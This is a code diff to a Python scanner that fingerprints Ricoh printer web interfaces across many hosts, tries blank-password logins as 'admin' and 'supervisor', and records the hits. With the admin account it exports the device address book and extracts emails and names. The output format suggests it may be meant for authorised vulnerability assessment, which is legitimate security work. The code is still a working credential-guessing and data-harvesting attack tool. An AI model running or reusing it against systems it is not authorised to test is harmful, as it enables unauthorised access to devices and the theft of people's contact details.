@@ -36,6 +36,104 @@ def build_target(base: str, default_scheme: str) -> Tuple[str, str, str]:
     return scheme, hostport, base_url
 
 
+def check_if_ricoh_printer(
+    base: str,
+    default_scheme: str,
+    timeout_seconds: int,
+    verify_tls: bool,
+    verbose: bool = False,
+) -> Tuple[str, bool, str]:
+    """
+    Check if the target is a Ricoh printer by accessing the main frame page.
+    Returns tuple: (host_display, is_ricoh, reason)
+    """
+    scheme, hostport, base_url = build_target(base, default_scheme)
+    
+    url = f"{base_url}/web/guest/en/websys/webArch/mainFrame.cgi"
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+    }
+    
+    if verbose:
+        print(f"\n{'='*80}")
+        print(f"[RICOH CHECK] {hostport}")
+        print(f"{'='*80}")
+        print(f"GET {url}")
+        print(f"{'='*80}")
+    
+    try:
+        resp = requests.get(
+            url,
+            headers=headers,
+            timeout=timeout_seconds,
+            verify=verify_tls,
+            allow_redirects=True,
+        )
+        
+        status = resp.status_code
+        text = resp.text or ""
+        
+        if verbose:
+            print(f"\n{'='*80}")
+            print(f"[RICOH CHECK RESPONSE] {hostport}")
+            print(f"{'='*80}")
+            print(f"Status: {status}")
+            print(f"Response Body ({len(text)} bytes):")
+            print(f"{text[:500]}")
+            if len(text) > 500:
+                print(f"... (truncated)")
+            print(f"{'='*80}\n")
+        
+        # Check if this looks like a Ricoh printer
+        # Look for Ricoh-specific content in the response
+        if status == 200:
+            # Check for common Ricoh printer indicators
+            ricoh_indicators = [
+                "RICOH",
+                "Web Image Monitor",
+                "websys/webArch",
+                "rimNote",
+                "rimLocal",
+                "/web/guest/",
+            ]
+            
+            text_upper = text.upper()
+            found_indicators = []
+            for indicator in ricoh_indicators:
+                if indicator.upper() in text_upper:
+                    found_indicators.append(indicator)
+            
+            if found_indicators:
+                reason = f"Ricoh printer detected (found: {', '.join(found_indicators[:3])})"
+                return hostport, True, reason
+            else:
+                reason = "Not a Ricoh printer (no Ricoh indicators found in response)"
+                return hostport, False, reason
+        elif status == 302 or status == 301:
+            # Redirect might indicate need for authentication - likely a Ricoh printer
+            location = resp.headers.get('Location', '')
+            if 'authForm.cgi' in location or 'login' in location.lower():
+                reason = "Ricoh printer detected (redirect to auth page)"
+                return hostport, True, reason
+            else:
+                reason = f"Unexpected redirect to: {location}"
+                return hostport, False, reason
+        elif status == 404:
+            reason = f"Not a Ricoh printer (HTTP {status} - page not found)"
+            return hostport, False, reason
+        else:
+            reason = f"Unexpected response (HTTP {status})"
+            return hostport, False, reason
+            
+    except RequestException as exc:
+        reason = f"Connection error: {exc.__class__.__name__}"
+        return hostport, False, reason
+
+
 def attempt_login(
     base: str,
     default_scheme: str,
@@ -43,12 +141,16 @@ def attempt_login(
     verify_tls: bool,
     return_session: bool = False,
     verbose: bool = False,
-) -> Tuple[str, str, int, dict]:
+    username: str = "admin",
+) -> Tuple[str, str, int, dict, str]:
     """
-    Returns tuple: (host_display, result, status_code, session_data)
+    Returns tuple: (host_display, result, status_code, session_data, username)
     result is one of: SUCCESS, FAIL, ERROR:<msg>
     session_data contains: {'cookies': {}, 'base_url': ''}
+    username: the username that was used for the login attempt
     """
+    import base64
+    
     scheme, hostport, base_url = build_target(base, default_scheme)
 
     url = f"{base_url}/web/guest/en/websys/webArch/login.cgi"
@@ -72,12 +174,14 @@ def attempt_login(
         "wimsesid": "--",
     }
 
+    # Encode username to base64
+    userid_encoded = base64.b64encode(username.encode('utf-8')).decode('utf-8')
+
     # Form body from the provided request
     data = {
         "wimToken": "1615404968",
         "userid_work": "",
-        # YWRtaW4= is base64("admin")
-        "userid": "YWRtaW4=",
+        "userid": userid_encoded,
         "password_work": "",
         "password": "",
         "open": "",
@@ -87,7 +191,7 @@ def attempt_login(
 
     if verbose:
         print(f"\n{'='*80}")
-        print(f"[LOGIN REQUEST] {hostport}")
+        print(f"[LOGIN REQUEST] {hostport} (username: {username})")
         print(f"{'='*80}")
         print(f"POST {url}")
         print(f"\nHeaders:")
@@ -134,21 +238,21 @@ def attempt_login(
         
         # Check for authentication failure
         if "Authentication has failed" in text:
-            return hostport, "FAIL", status, session_data
+            return hostport, "FAIL", status, session_data, username
         
         # Successful login returns 302 redirect to mainFrame.cgi
         if status == 302:
             location = resp.headers.get('Location', '')
             if 'mainFrame.cgi' not in location and 'authForm.cgi' in location:
                 # Redirect to login form means failure
-                return hostport, "FAIL", status, session_data
+                return hostport, "FAIL", status, session_data, username
             # Otherwise, 302 to mainFrame.cgi is success
         elif status == 200:
             # Some versions might return 200, that's OK
             pass
         else:
             # Other status codes are errors
-            return hostport, f"ERROR: HTTP {status}", status, session_data
+            return hostport, f"ERROR: HTTP {status}", status, session_data, username
         
         # If login successful and session requested, capture session cookies
         if return_session:
@@ -204,9 +308,9 @@ def attempt_login(
                 'base_url': base_url
             }
         
-        return hostport, "SUCCESS", status, session_data
+        return hostport, "SUCCESS", status, session_data, username
     except RequestException as exc:
-        return hostport, f"ERROR: {exc.__class__.__name__}: {exc}", 0, session_data
+        return hostport, f"ERROR: {exc.__class__.__name__}: {exc}", 0, session_data, username
 
 
 def export_address_book(
@@ -577,6 +681,11 @@ def main() -> int:
         action="store_true",
         help="Enable verbose output for debugging",
     )
+    parser.add_argument(
+        "--success-file",
+        default="successful_logins.txt",
+        help="Output file for successful logins in tab-delimited format (default: successful_logins.txt)",
+    )
 
     args = parser.parse_args()
 
@@ -599,44 +708,139 @@ def main() -> int:
     if args.export:
         os.makedirs(args.output_dir, exist_ok=True)
 
-    results: List[Tuple[str, str, int, dict]] = []
+    results: List[Tuple[str, str, int, dict, str]] = []
+    successful_logins: List[Tuple[str, str, str, str, str]] = []  # (AssetName, URI, Protocol, Port, Output)
+    
+    print(f"Step 1: Checking if {len(hosts)} host(s) are Ricoh printers...")
+    print(f"Workers: {args.workers}")
+    print("-" * 80)
+    
+    # First, check which hosts are Ricoh printers
+    ricoh_hosts = []
+    skipped = 0
+    
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
-        futures = [
-            executor.submit(
-                attempt_login, host, args.scheme, args.timeout, args.verify, args.export, args.verbose
-            )
+        check_futures = {
+            executor.submit(check_if_ricoh_printer, host, args.scheme, args.timeout, args.verify, args.verbose): host
             for host in hosts
-        ]
-        for fut in concurrent.futures.as_completed(futures):
-            results.append(fut.result())
-
+        }
+        
+        for future in concurrent.futures.as_completed(check_futures):
+            hostport, is_ricoh, reason = future.result()
+            if is_ricoh:
+                ricoh_hosts.append(check_futures[future])
+                print(f"✓ {hostport}\t{reason}")
+            else:
+                skipped += 1
+                print(f"✗ {hostport}\tSKIPPED: {reason}")
+    
+    if not ricoh_hosts:
+        print("\nNo Ricoh printers found. Exiting.")
+        return 1
+    
+    print(f"\n{'-'*80}")
+    print(f"Step 2: Testing credentials on {len(ricoh_hosts)} confirmed Ricoh printer(s)...")
+    print(f"Testing usernames: admin, supervisor")
+    
+    total_tests = len(ricoh_hosts) * 2  # Testing both admin and supervisor per Ricoh host
+    completed = 0
+    
+    print(f"Total credential tests: {total_tests}")
+    print("-" * 80)
+    
     successes = 0
     failures = 0
     errors = 0
     exported = 0
-
-    for host, outcome, status_code, session_data in sorted(results, key=lambda r: r[0]):
-        print(f"{host}\t{outcome}\tstatus={status_code}")
-        if outcome == "SUCCESS":
-            successes += 1
-            
-            # Export address book if export flag is set
-            if args.export and session_data:
-                export_host, export_result = export_address_book(
-                    host, session_data, args.export_timeout, args.verify, args.output_dir, args.verbose
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+        futures = []
+        # Test both admin and supervisor accounts for each confirmed Ricoh host
+        for host in ricoh_hosts:
+            # Test admin account
+            futures.append(
+                executor.submit(
+                    attempt_login, host, args.scheme, args.timeout, args.verify, args.export, args.verbose, "admin"
                 )
-                print(f"{export_host}\tEXPORT: {export_result}")
-                if "SUCCESS" in export_result:
-                    exported += 1
-        elif outcome == "FAIL":
-            failures += 1
-        else:
-            errors += 1
+            )
+            # Test supervisor account
+            futures.append(
+                executor.submit(
+                    attempt_login, host, args.scheme, args.timeout, args.verify, False, args.verbose, "supervisor"
+                )
+            )
+        
+        # Process results as they complete and show real-time progress
+        for fut in concurrent.futures.as_completed(futures):
+            result = fut.result()
+            results.append(result)
+            completed += 1
+            
+            host, outcome, status_code, session_data, username_used = result
+            
+            # Print result immediately
+            print(f"[{completed}/{total_tests}] {host}\t{username_used}\t{outcome}\tstatus={status_code}")
+            
+            if outcome == "SUCCESS":
+                successes += 1
+                
+                # Parse protocol and port from the host/session data
+                # Get base_url from session_data if available, otherwise reconstruct
+                if session_data and 'base_url' in session_data:
+                    base_url = session_data['base_url']
+                else:
+                    scheme, hostport, base_url = build_target(host, args.scheme)
+                
+                # Parse the base_url to extract protocol and port
+                parsed = urlparse(base_url)
+                protocol = "tcp"  # Web services use TCP
+                
+                # Determine port
+                if parsed.port:
+                    port = str(parsed.port)
+                else:
+                    # Use default ports based on scheme
+                    port = "443" if parsed.scheme == "https" else "80"
+                
+                # Create output message
+                output_msg = f"Successful login with username '{username_used}' and blank password (HTTP {status_code})"
+                
+                # Add to successful logins list
+                # Format: AssetName, URI, Protocol, Port, Output
+                asset_name = parsed.netloc or host  # Use netloc (host:port) or original host
+                uri = parsed.netloc or host
+                successful_logins.append((asset_name, uri, protocol, port, output_msg))
+                
+                # Export address book only if admin account succeeded and export flag is set
+                # Supervisor account cannot export address books
+                if args.export and session_data and username_used == "admin":
+                    export_host, export_result = export_address_book(
+                        host, session_data, args.export_timeout, args.verify, args.output_dir, args.verbose
+                    )
+                    print(f"[{completed}/{total_tests}] {export_host}\tEXPORT: {export_result}")
+                    if "SUCCESS" in export_result:
+                        exported += 1
+            elif outcome == "FAIL":
+                failures += 1
+            else:
+                errors += 1
 
-    summary = f"\nTotal: {len(results)}\tSUCCESS: {successes}\tFAIL: {failures}\tERROR: {errors}"
+    summary = f"\nTotal Hosts: {len(hosts)}\tRicoh Printers: {len(ricoh_hosts)}\tSkipped: {skipped}"
+    summary += f"\nCredential Tests: {len(results)}\tSUCCESS: {successes}\tFAIL: {failures}\tERROR: {errors}"
     if args.export:
         summary += f"\tEXPORTED: {exported}"
     print(summary)
+    
+    # Write successful logins to tab-delimited file
+    if successful_logins:
+        with open(args.success_file, "w", encoding="utf-8") as f:
+            # Write header comment
+            f.write("# Format: AssetName\tURI\tProtocol\tPort\tOutput\n")
+            # Write each successful login
+            for asset_name, uri, protocol, port, output_msg in successful_logins:
+                f.write(f"{asset_name}\t{uri}\t{protocol}\t{port}\t{output_msg}\n")
+        
+        print(f"\nSuccessful logins saved to: {args.success_file} ({len(successful_logins)} entry/entries)")
     
     # Extract emails and names from all exported address books
     if args.export and exported > 0:
